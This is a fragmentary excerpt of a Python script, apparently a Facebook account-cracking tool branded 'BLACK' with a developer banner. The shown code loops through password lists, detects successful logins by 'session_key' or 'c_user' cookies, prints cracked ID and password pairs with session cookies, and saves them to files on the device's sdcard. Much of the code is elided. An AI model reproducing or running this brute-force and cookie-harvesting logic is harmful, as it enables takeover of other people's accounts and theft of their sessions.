...
{RX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}[{B}={R}] {G}DEVELOPER  {RX} ⬤{G}  Ebrahim {R}[{I} BLACK {R}]
{R}[{B}={R}] {G}FACEBOOK   {RX} ⬤ {G} Md Ebrahim Miah
{R}[{B}={R}] {G}GITHUB     {RX} ⬤ {G} BLACK-505
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in req:
                print('\r\r\033[1;32m [BLACK-💉] '+ids+'|'+pas)
                oks.append(ids)
                break
...
def flash(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                if res == 'LIVE':
                  print('\r\r\033[1;32m [BLACK-💉] '+cid+' | '+ps)
                  print('\r\033[1;37m [🍪] COOKIES :- '+coki)
                  open('/sdcard/BLACK-OK.txt', 'a').write( cid+' | '+ps+'+\n')
                  open('/sdcard/BLACK-COOKIE.txt', 'a').write( coki+' | '+uid+'+\n')
                  oks.append(uid)
                  break
                if res == 'LOCK':
